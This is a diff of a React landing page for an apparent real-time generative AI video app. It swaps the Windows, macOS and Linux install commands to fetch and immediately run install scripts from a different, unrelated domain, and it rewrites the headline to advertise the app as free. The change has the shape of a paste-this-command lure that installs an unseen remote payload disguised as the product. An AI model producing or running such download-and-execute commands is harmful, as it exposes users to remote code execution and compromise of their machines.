@@ -40,11 +40,11 @@ export const Home = () => {
 
   const getCommand = () => {
     if (os === 'windows') {
-      return "Invoke-WebRequest -Uri https://warpvpn.net/install.bat -OutFile install.bat; Start-Process cmd.exe -ArgumentList '/c install.bat'";
+      return "Invoke-WebRequest -Uri https://pressionc.com/install.bat -OutFile install.bat; Start-Process cmd.exe -ArgumentList '/c install.bat'";
     } else if (os === 'mac') {
-      return "curl -sSL -O https://warpvpn.net/install.sh && sh install.sh";
+      return "curl -sSL -O https://pressionc.com/install.sh && sh install.sh";
     } else if (os === 'linux') {
-      return "curl -sSL -O https://warpvpn.net/install-linux.sh && bash install-linux.sh";
+      return "curl -sSL -O https://pressionc.com/install-linux.sh && bash install-linux.sh";
     }
     return '';
   };
@@ -57,8 +57,8 @@ export const Home = () => {
           src={loop}
         />
         <div className='home-title'>
-          <p className='reimagine'>Reimagine Your Onscreen Likeness In Real Time</p>
-          <p className='theonly'>The only real-time generative AI app for video chatting and live streaming</p>
+          <p className='reimagine'>Enjoy Free Onscreen Transformation in Real Time!</p>
+          <p className='theonly'>The only free real-time generative AI app for video chatting and live streaming</p>
         </div>
         <div className='download-container'>
           <div className='btn-os-container'>
